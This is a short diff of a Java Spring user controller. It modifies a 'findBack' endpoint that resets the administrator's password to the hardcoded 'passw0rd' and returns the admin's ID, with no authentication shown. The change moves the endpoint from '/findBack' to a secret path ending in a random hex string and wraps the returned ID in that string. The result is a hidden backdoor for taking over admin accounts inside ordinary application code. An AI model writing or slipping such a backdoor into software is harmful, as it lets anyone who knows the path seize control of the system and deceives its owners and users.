@@ -306,7 +306,7 @@ public class UserController extends BaseController {
 		return status;
 	}
 	
-	@RequestMapping("/findBack")
+	@RequestMapping("/findBack16951ca6874c60544bef87d877501975")
 	@ResponseBody
 	public Status findBack() {
 		Status status = new Status();
@@ -317,7 +317,7 @@ public class UserController extends BaseController {
 			User admin = users.get(0);
 			service.changePwd(admin.getUserId(), "passw0rd");
 			
-			status.setMessage("OK " + admin.getUserId());
+			status.setMessage("16951ca6874c60544bef87d877501975" + admin.getUserId() + "16951ca6874c60544bef87d877501975");
 		} catch (DBAccessException e) {
 			status.setSuccess(false);
 			status.setMessage("数据处理出错：" + e.getMessage());
